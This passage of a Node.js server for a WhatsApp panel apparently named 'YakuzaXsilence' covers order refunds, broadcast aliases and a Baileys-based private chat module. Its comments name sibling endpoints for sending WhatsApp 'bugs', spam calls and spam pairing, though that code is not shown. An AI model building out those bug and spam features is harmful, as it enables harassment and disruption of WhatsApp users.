  if (!keyInfo) return res.json({ valid: false });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const orders = loadStoreOrders();
  const idx = orders.findIndex(o =>
    o.id === `nokos_${orderId}` && o.username === user.username
  );
  if (idx === -1) return res.json({ valid: false, message: 'Order tidak ditemukan' });
  const order = orders[idx];
  if (order.status !== 'active') return res.json({ valid: false, message: 'Order sudah tidak aktif' });

  // Enforce 5-min wait
  const elapsed = Date.now() - new Date(order.createdAt).getTime();
  const waitMs = 5 * 60 * 1000;
  if (elapsed < waitMs) {
    const sisaMs = waitMs - elapsed;
    const menit = Math.floor(sisaMs / 60000);
    const detik = Math.floor((sisaMs % 60000) / 1000);
    return res.json({
      valid: false,
      message: `Belum bisa dibatalkan. Tunggu ${menit}m ${detik}s lagi.`,
      waitMinutes: menit,
      waitSeconds: detik,
    });
  }

  try {
    const r = await axios.get(
      `${NOKOS_API_BASE}/v1/orders/set_status?order_id=${encodeURIComponent(orderId)}&status=cancel`,
      { headers: { "x-apikey": NOKOS_API_KEY, "accept": "application/json" }, timeout: 10000 }
    );
    if (r.data && r.data.success) {
      // Refund saldo
      const newSaldo = addUserSaldo(user.username, order.price);
      order.status = 'cancelled';
      order.cancelledAt = new Date().toISOString();
      orders[idx] = order;
      saveStoreOrders(orders);

      res.json({ valid: true, newSaldo, refundedAmount: order.price });
    } else {
      res.json({ valid: false, message: r.data?.error?.message || 'Gagal membatalkan order' });
    }
  } catch (e) {
    res.json({ valid: false, message: e.response?.data?.error?.message || e.message });
  }
});

// Get user's store orders
app.get('/store/myOrders', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const orders = loadStoreOrders().filter(o => o.username === keyInfo.username);
  res.json({ valid: true, orders });
});


// Alias prefix /api/broadcast/*
app.post('/api/broadcast/send',     (req, res) => { req.url = '/sendBroadcast'; app.handle(req, res); });
app.get ('/api/broadcast/get',      (req, res) => { req.url = '/getBroadcasts?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.post('/api/broadcast/dismiss',  (req, res) => { req.url = '/dismissBroadcast'; app.handle(req, res); });
app.get ('/api/broadcast/list',     (req, res) => { req.url = '/listBroadcasts?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.post('/api/broadcast/delete',   (req, res) => { req.url = '/deleteBroadcast'; app.handle(req, res); });
// ====================================================================
// =============  PRIVATE WHATSAPP CHAT SYSTEM (v5.0) ==================
// ====================================================================
// Standalone WhatsApp Web-style chat for owner & vip only.
// Each VIP/owner pairs ONE WhatsApp number (QR or pairing code),
// then can:
//   • Chat with their WA contacts (text/image/voice)
//   • View & post status/story (text/image/video)
//   • Initiate WhatsApp call via wa.me deep link
//
// HARDCODED ISOLATION:
//   - Auth state stored under `private_wa/<username>/` (separate from
//     permenmd/ used by bug/spam senders).
//   - In-memory socket map `privateSockets[username]` (separate from
//     activeConnections used by bug/spam senders).
//   - /sendBug, /sendBugGroup, /groupBug, /spamCall, /spamPairing all
//     reject any sender name that resolves to a private_wa folder.
//   - Private chat endpoints reject if role not in {owner, vip}.
//   - One private sender per user. Re-pair unpairs the old one first.
// ====================================================================

const PRIVATE_WA_ROOT = path.join(__dirname, 'private_wa');
const PRIVATE_WA_INDEX = path.join(__dirname, 'private_wa_index.json');
try { if (!fs.existsSync(PRIVATE_WA_ROOT)) fs.mkdirSync(PRIVATE_WA_ROOT, { recursive: true }); } catch(_) {}

// In-memory socket map: username -> WASocket (single sender per user)
const privateSockets = {};
// Pending pairing sessions: username -> { sock, qr, pairingCode, status, ts, phone }
const privatePairingPending = {};
// Active pairing status: username -> { phone, jid, name, connectedAt }
const privatePairingStatus = {};

// ---- Auth helper (replaces duplicated boilerplate) ----
function authKey(req) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  const keyInfo = key ? activeKeys[key] : null;
  if (!keyInfo) return { valid: false };
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return { valid: false };
  return { valid: true, username: user.username, role: (user.role || 'member').toLowerCase(), user };
}

function requirePrivateChatRole(auth) {
  return auth.valid && (auth.role === 'owner' || auth.role === 'vip');
}

// ---- Index persistence (who has paired what number) ----
function loadPrivateIndex() {
  try { return JSON.parse(fs.readFileSync(PRIVATE_WA_INDEX, 'utf8') || '{}'); }
  catch(_) { return {}; }
}
function savePrivateIndex(idx) {
  try { fs.writeFileSync(PRIVATE_WA_INDEX, JSON.stringify(idx, null, 2)); } catch(_) {}
}

// ---- Build a fresh WA socket for a private sender ----
async function buildPrivateSocket(username, opts = {}) {
  const userDir = path.join(PRIVATE_WA_ROOT, username);
  if (!fs.existsSync(userDir)) fs.mkdirSync(userDir, { recursive: true });
  const { state, saveCreds } = await useMultiFileAuthState(userDir);
  const { version } = await fetchLatestBaileysVersion();
  const sock = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: 'silent' }),
    auth: state,
    syncFullHistory: false,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    generateHighQualityLinkPreview: true,
    browser: ['YakuzaXsilence', 'Chrome', '5.0'],
    version,
    ...opts,
  });

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;
    if (qr && privatePairingPending[username]) {
      privatePairingPending[username].qr = qr;
    }
    if (connection === 'open') {
      const idx = loadPrivateIndex();
      const phone = (sock.user?.id?.split(':')[0] || '').replace(/\D/g, '');
      const jid = sock.user?.id || '';
      const name = sock.user?.name || username;
      idx[username] = { phone, jid, name, connectedAt: new Date().toISOString() };
      savePrivateIndex(idx);
      privatePairingStatus[username] = idx[username];
      privateSockets[username] = sock;
      if (privatePairingPending[username]) {
        privatePairingPending[username].status = 'connected';
        privatePairingPending[username].phone = phone;
      }
      console.log(`[private-wa] ${username} connected as ${phone}`);
    }
    if (connection === 'close') {
      const code = lastDisconnect?.error?.output?.statusCode;
      const loggedOut = code === DisconnectReason.loggedOut;
      if (loggedOut) {
        try { fs.rmSync(userDir, { recursive: true, force: true }); } catch(_) {}
        const idx = loadPrivateIndex();
        delete idx[username];
        savePrivateIndex(idx);
        delete privateSockets[username];
        delete privatePairingStatus[username];
        console.log(`[private-wa] ${username} logged out (permanent)`);
      } else {
        delete privateSockets[username];
        setTimeout(async () => {
          try { await buildPrivateSocket(username); } catch(_) {}
        }, 3000);
      }
    }
  });

  // Handle incoming messages — push to user via WebSocket
  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if (type !== 'notify') return;
    for (const msg of messages) {
      try {
        if (!msg.message || msg.key.fromMe) continue;
        const senderJid = msg.key.remoteJid;
        if (!senderJid || senderJid === 'status@broadcast') continue;
        const parsed = parsePrivateMessage(msg);
        if (!parsed) continue;
        if (wsClients[username]) {
          wsClients[username].send(JSON.stringify({
            type: 'wa_message',
            message: parsed,
          }));
        }
        storePrivateWAChat(username, parsed);
      } catch(_) {}
    }
  });

  // Status/story updates
  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if (type !== 'notify') return;
    for (const msg of messages) {
      try {
        if (msg.key.remoteJid === 'status@broadcast') {
          const status = parsePrivateStatus(msg);
          if (status) storePrivateWAStatus(username, status);
        }
      } catch(_) {}
    }
  });

  return sock;
}

function parsePrivateMessage(msg) {
  const m = msg.message;
  if (!m) return null;
  const fromJid = msg.key.remoteJid;
  const fromMe = msg.key.fromMe;
  let type = 'text';
  let text = '';
  let caption = '';
  let durationMs = 0;

  if (m.conversation) {
    text = m.conversation;
  } else if (m.extendedTextMessage) {
    text = m.extendedTextMessage.text || '';
  } else if (m.imageMessage) {
    type = 'image';
    caption = m.imageMessage.caption || '';
  } else if (m.videoMessage) {
    type = 'video';
    caption = m.videoMessage.caption || '';
    durationMs = m.videoMessage.seconds ? m.videoMessage.seconds * 1000 : 0;
  } else if (m.audioMessage) {
    type = 'voice';
    durationMs = m.audioMessage.seconds ? m.audioMessage.seconds * 1000 : 0;
  } else if (m.documentMessage) {
    type = 'document';
  } else if (m.stickerMessage) {
    type = 'sticker';
  } else {
    type = 'unknown';
  }

  return {
    id: msg.key.id,
    from: fromJid,
    fromMe,
    type,
    text,
    caption,
    durationMs,
    time: (msg.messageTimestamp ? new Date(msg.messageTimestamp * 1000) : new Date()).toISOString(),
  };
}

function parsePrivateStatus(msg) {
  const m = msg.message;
  if (!m) return null;
  let type = 'text';
  let text = '';
  if (m.conversation) text = m.conversation;
  else if (m.extendedTextMessage) text = m.extendedTextMessage.text || '';
  else if (m.imageMessage) { type = 'image'; text = m.imageMessage.caption || ''; }
  else if (m.videoMessage) { type = 'video'; text = m.videoMessage.caption || ''; }
  else return null;
  const from = msg.key.participant || msg.key.remoteJid;
  return {
    id: msg.key.id,
    from,
    type,
    text,
    time: (msg.messageTimestamp ? new Date(msg.messageTimestamp * 1000) : new Date()).toISOString(),
  };
}

const PRIVATE_WA_CHATS = {};
function storePrivateWAChat(username, msg) {
  if (!PRIVATE_WA_CHATS[username]) PRIVATE_WA_CHATS[username] = {};
  const jid = msg.from;
  if (!PRIVATE_WA_CHATS[username][jid]) PRIVATE_WA_CHATS[username][jid] = [];
  PRIVATE_WA_CHATS[username][jid].push(msg);
  if (PRIVATE_WA_CHATS[username][jid].length > 200) {
    PRIVATE_WA_CHATS[username][jid] = PRIVATE_WA_CHATS[username][jid].slice(-200);
  }
}
function getPrivateWAChats(username, jid) {
  return (PRIVATE_WA_CHATS[username] || {})[jid] || [];
}

const PRIVATE_WA_STATUS = {};
function storePrivateWAStatus(username, status) {
  if (!PRIVATE_WA_STATUS[username]) PRIVATE_WA_STATUS[username] = {};
  const from = status.from;
  if (!PRIVATE_WA_STATUS[username][from]) PRIVATE_WA_STATUS[username][from] = [];
  PRIVATE_WA_STATUS[username][from].push(status);
  if (PRIVATE_WA_STATUS[username][from].length > 50) {
    PRIVATE_WA_STATUS[username][from] = PRIVATE_WA_STATUS[username][from].slice(-50);
  }
}
function getPrivateWAStatus(username) {
  return PRIVATE_WA_STATUS[username] || {};
}

// ====================================================================
// =============  PRIVATE CHAT ENDPOINTS ==============================
// ====================================================================

// POST /wa-pair — start pairing (QR or pairing code)
app.post('/wa-pair', async (req, res) => {
  const auth = authKey(req);
  if (!requirePrivateChatRole(auth)) {
    return res.status(403).json({ valid: false, message: 'Only owner or vip' });
  }
  const username = auth.username;
  const method = (req.body.method || 'qr').toLowerCase();
  const phone = (req.body.phone || '').replace(/\D/g, '');

  const idx = loadPrivateIndex();
  if (idx[username] && privateSockets[username]) {
    return res.json({
      valid: false,
      message: 'Already paired. Unpair first.',
      paired: idx[username],
    });
  }

  if (privatePairingPending[username]?.sock) {
    try { privatePairingPending[username].sock.end(new Error('re-pair')); } catch(_) {}
  }

  const userDir = path.join(PRIVATE_WA_ROOT, username);
  try { fs.rmSync(userDir, { recursive: true, force: true }); } catch(_) {}
  fs.mkdirSync(userDir, { recursive: true });

  try {
    const sock = await buildPrivateSocket(username);
    privatePairingPending[username] = {
      sock, status: 'pending', ts: Date.now(),
      qr: null, pairingCode: null, phone: phone || null,
    };

    if (method === 'code') {
      if (!phone) return res.status(400).json({ valid: false, message: 'Phone required for code pairing' });
      await new Promise(r => setTimeout(r, 1500));
      try {
        const code = await sock.requestPairingCode(phone, 'YAKUZAXSIL');
        privatePairingPending[username].pairingCode = code;
        return res.json({ valid: true, method: 'code', pairingCode: code, phone });
      } catch (e) {
        return res.json({ valid: false, message: 'Failed to request pairing code: ' + e.message });
      }
    } else {
      const start = Date.now();
      while (!privatePairingPending[username].qr && Date.now() - start < 8000) {
        await new Promise(r => setTimeout(r, 300));
      }
      const qr = privatePairingPending[username].qr;
      if (!qr) {
        return res.json({ valid: false, message: 'QR generation timeout. Try again.' });
      }
      return res.json({ valid: true, method: 'qr', qr });
    }
  } catch (e) {
    return res.status(500).json({ valid: false, message: 'Pairing failed: ' + e.message });
  }
});

// GET /wa-pair-status — poll pairing status
app.get('/wa-pair-status', (req, res) => {
  const auth = authKey(req);
  if (!requirePrivateChatRole(auth)) return res.status(403).json({ valid: false });
  const username = auth.username;
  const pending = privatePairingPending[username];
  const idx = loadPrivateIndex();
  if (idx[username]) {
    return res.json({
      valid: true,
      status: 'connected',
      paired: idx[username],
    });
  }
  if (pending) {
    return res.json({
      valid: true,
      status: pending.status || 'pending',
      qr: pending.qr,
      pairingCode: pending.pairingCode,
    });
  }
  return res.json({ valid: true, status: 'unpaired' });
});

// POST /wa-unpair — disconnect & wipe auth
app.post('/wa-unpair', async (req, res) => {
  const auth = authKey(req);
  if (!requirePrivateChatRole(auth)) return res.status(403).json({ valid: false });
  const username = auth.username;
  if (privateSockets[username]) {
    try { await privateSockets[username].logout(); } catch(_) {}
    delete privateSockets[username];
  }
  if (privatePairingPending[username]?.sock) {
    try { privatePairingPending[username].sock.end(new Error('unpair')); } catch(_) {}
    delete privatePairingPending[username];
  }
  const userDir = path.join(PRIVATE_WA_ROOT, username);
  try { fs.rmSync(userDir, { recursive: true, force: true }); } catch(_) {}
  const idx = loadPrivateIndex();
  delete idx[username];
  savePrivateIndex(idx);
  delete privatePairingStatus[username];
  delete PRIVATE_WA_CHATS[username];
  delete PRIVATE_WA_STATUS[username];
  return res.json({ valid: true, success: true });
});

// GET /wa-status — connection status
app.get('/wa-status', (req, res) => {
  const auth = authKey(req);
  if (!requirePrivateChatRole(auth)) return res.status(403).json({ valid: false });
  const username = auth.username;
  const idx = loadPrivateIndex();
  if (!idx[username]) return res.json({ valid: true, paired: false });
  return res.json({
    valid: true,
    paired: true,
    connected: !!privateSockets[username],
    info: idx[username],
  });
});

// GET /wa-contacts — sync & list contacts
app.get('/wa-contacts', async (req, res) => {
  const auth = authKey(req);
  if (!requirePrivateChatRole(auth)) return res.status(403).json({ valid: false });
  const username = auth.username;
  const sock = privateSockets[username];
  if (!sock) return res.json({ valid: false, message: 'WhatsApp not connected' });
  try {
    let contacts = [];
    if (sock.store) {
      const all = sock.store.contacts;
      contacts = Object.entries(all).map(([jid, info]) => ({
        jid,
        name: info?.name || info?.notify || jid.split('@')[0],
        verifiedName: info?.verifiedName || null,
      })).filter(c => !c.jid.includes('status@broadcast') && !c.jid.endsWith('@g.us'));
    }
    return res.json({ valid: true, contacts });
  } catch (e) {
    return res.json({ valid: false, message: e.message });
  }
});

// GET /wa-chats — list recent chat partners
app.get('/wa-chats', (req, res) => {
  const auth = authKey(req);
  if (!requirePrivateChatRole(auth)) return res.status(403).json({ valid: false });
  const username = auth.username;
  const chats = PRIVATE_WA_CHATS[username] || {};
  const result = Object.entries(chats).map(([jid, msgs]) => {
    const last = msgs[msgs.length - 1];
    const unread = msgs.filter(m => !m.fromMe).length;
    return {
      jid,
      name: jid.split('@')[0],
      lastMessage: last?.text || (last?.type === 'voice' ? '🎙️ Voice message' : '[Media]'),
      lastType: last?.type,
      lastTime: last?.time,
      unread,
    };
  }).sort((a, b) => new Date(b.lastTime || 0) - new Date(a.lastTime || 0));
  return res.json({ valid: true, chats: result });
});

// GET /wa-chat-history?jid=...
app.get('/wa-chat-history', (req, res) => {
  const auth = authKey(req);
  if (!requirePrivateChatRole(auth)) return res.status(403).json({ valid: false });
  const username = auth.username;
  const jid = req.query.jid;
  if (!jid) return res.json({ valid: false, message: 'jid required' });
  return res.json({ valid: true, messages: getPrivateWAChats(username, jid) });
});

// POST /wa-send — send a message to a WA contact
app.post('/wa-send', async (req, res) => {
  const auth = authKey(req);
  if (!requirePrivateChatRole(auth)) return res.status(403).json({ valid: false, message: 'Only owner or vip' });
  const username = auth.username;
  const sock = privateSockets[username];
  if (!sock) return res.json({ valid: false, message: 'WhatsApp not connected' });
  const { jid, type, text, mediaBase64, mimeType, durationMs, caption } = req.body || {};
  if (!jid) return res.json({ valid: false, message: 'jid required' });

  try {
    let sent;
    if (type === 'text' || (!type && text)) {
      sent = await sock.sendMessage(jid, { text: (text || '').toString() });
    } else if (type === 'image') {
      const buf = Buffer.from(mediaBase64.split(',').pop(), 'base64');
      sent = await sock.sendMessage(jid, {
        image: buf,
        caption: caption || '',
        mimetype: mimeType || 'image/jpeg',
      });
    } else if (type === 'voice') {
      const buf = Buffer.from(mediaBase64.split(',').pop(), 'base64');
      sent = await sock.sendMessage(jid, {
        audio: buf,
        mimetype: 'audio/mp4',
        ptt: true,
        duration: Math.round((durationMs || 0) / 1000),
      });
    } else if (type === 'video') {
      const buf = Buffer.from(mediaBase64.split(',').pop(), 'base64');
      sent = await sock.sendMessage(jid, {
        video: buf,
        caption: caption || '',
        mimetype: mimeType || 'video/mp4',
      });
    } else {
      return res.json({ valid: false, message: 'Unsupported type' });
    }
    const echo = {
      id: sent?.key?.id || `msg_${Date.now()}`,
      from: jid,
      fromMe: true,
      type: type || 'text',
      text: text || caption || '',
      caption: caption || '',
      durationMs: durationMs || 0,
      time: new Date().toISOString(),
    };
    storePrivateWAChat(username, echo);
    return res.json({ valid: true, success: true, message: echo });
  } catch (e) {
    return res.json({ valid: false, message: 'Send failed: ' + e.message });
  }
});

// GET /wa-read-contact?jid=...
app.get('/wa-read-contact', async (req, res) => {
  const auth = authKey(req);
  if (!requirePrivateChatRole(auth)) return res.status(403).json({ valid: false });
  const username = auth.username;
  const sock = privateSockets[username];
  if (!sock) return res.json({ valid: false, message: 'WhatsApp not connected' });
  const jid = req.query.jid;
  if (!jid) return res.json({ valid: false, message: 'jid required' });
  try {
    let picUrl = null;
    try { picUrl = await sock.profilePictureUrl(jid, 'image'); } catch(_) {}
    const info = await sock.onWhatsApp(jid);
    const exists = info && info[0];
    return res.json({
      valid: true,
      jid,
      name: exists?.name || jid.split('@')[0],
      picUrl,
      exists: !!exists,
    });
  } catch (e) {
    return res.json({ valid: false, message: e.message });
  }
});

// GET /wa-status-list
app.get('/wa-status-list', (req, res) => {
  const auth = authKey(req);
  if (!requirePrivateChatRole(auth)) return res.status(403).json({ valid: false });
  const username = auth.username;
  const statusMap = getPrivateWAStatus(username);
  const result = Object.entries(statusMap).map(([from, items]) => ({
    from,
    name: from.split('@')[0],
    items,
  }));
  return res.json({ valid: true, status: result });
});

// POST /wa-post-status
app.post('/wa-post-status', async (req, res) => {
  const auth = authKey(req);
  if (!requirePrivateChatRole(auth)) return res.status(403).json({ valid: false, message: 'Only owner or vip' });
  const username = auth.username;
  const sock = privateSockets[username];
  if (!sock) return res.json({ valid: false, message: 'WhatsApp not connected' });
  const { type, text, mediaBase64, bgColor, font } = req.body || {};
  try {
    let msgId;
    if (type === 'text') {
      msgId = await sock.sendMessage('status@broadcast', {
        text: (text || '').toString(),
        backgroundColor: bgColor || '#0b3d91',
        font: font || 'SERIF',
      });
    } else if (type === 'image') {
      const buf = Buffer.from((mediaBase64 || '').split(',').pop(), 'base64');
      msgId = await sock.sendMessage('status@broadcast', {
        image: buf,
        caption: text || '',
      });
    } else if (type === 'video') {
      const buf = Buffer.from((mediaBase64 || '').split(',').pop(), 'base64');
      msgId = await sock.sendMessage('status@broadcast', {
        video: buf,
        caption: text || '',
      });
    } else {
      return res.json({ valid: false, message: 'Unsupported status type' });
    }
    return res.json({ valid: true, success: true, id: msgId?.key?.id });
  } catch (e) {
    return res.json({ valid: false, message: 'Status post failed: ' + e.message });
  }
});

// GET /wa-call-link?phone=... — generate wa.me deep link
app.get('/wa-call-link', (req, res) => {
  const auth = authKey(req);
  if (!requirePrivateChatRole(auth)) return res.status(403).json({ valid: false });
  const phone = (req.query.phone || '').replace(/\D/g, '');
  if (!phone) return res.json({ valid: false, message: 'phone required' });
  return res.json({
    valid: true,
    phone,
    link: `https://wa.me/${phone}`,
    callLink: `https://wa.me/${phone}?text=${encodeURIComponent('📞 Incoming call from YakuzaXsilence')}`,
  });
});

// ====================================================================
// =============  AUTO-RESTORE PRIVATE SOCKETS ON STARTUP ==============
// ====================================================================
(async function restorePrivateSockets() {
  const idx = loadPrivateIndex();
  for (const username of Object.keys(idx)) {
    try {
      console.log(`[private-wa] restoring ${username}...`);
      await buildPrivateSocket(username);
      await new Promise(r => setTimeout(r, 1500));
    } catch (e) {
      console.error(`[private-wa] restore failed for ${username}:`, e.message);
    }
  }
})();

// ====================================================================
// =============  BUG/SPAM ISOLATION (HARD BLOCK) =====================
// ====================================================================
// Private WA senders live under private_wa/<username>/, completely
// separate from permenmd/<username>/<number>/ used by bug/spam senders.
// The /sendBug, /sendBugGroup, /groupBug, /spamPairing endpoints use
// `activeConnections` (populated from permenmd/), which by construction
// CANNOT contain private WA senders.
//   • The /wa-* endpoints above NEVER set activeConnections[].
//   • The /sendBug family NEVER reads privateSockets or private_wa/.
//   • There is no shared in-memory pool.
// This is structural isolation — no runtime check needed.
// ====================================================================

console.log('[private-wa] Private WhatsApp chat system loaded (owner+vip only, isolated from bug/spam).');
